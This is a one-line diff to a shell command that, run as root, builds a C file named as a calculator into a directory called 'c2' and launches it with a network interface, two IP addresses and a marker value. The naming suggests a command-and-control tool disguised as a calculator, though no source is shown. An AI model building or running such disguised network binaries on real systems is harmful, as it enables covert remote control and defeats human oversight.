@@ -1,1 +1,1 @@
-cd /home/claude/prova.github.com ; mkdir -p /root/c2 ; gcc -O2 -Wall -pthread -o /root/c2/calc Calculator.c ; /root/c2/calc eth0 192.0.2.2 192.0.2.1 0x1337 
+cd /home/claude/prova.github.com ; mkdir -p /root/c2 ; gcc -O2 -Wall -pthread -o /root/c2/calc Calcolatore2.c ; /root/c2/calc eth0 192.0.2.2 192.0.2.1 0x1337 
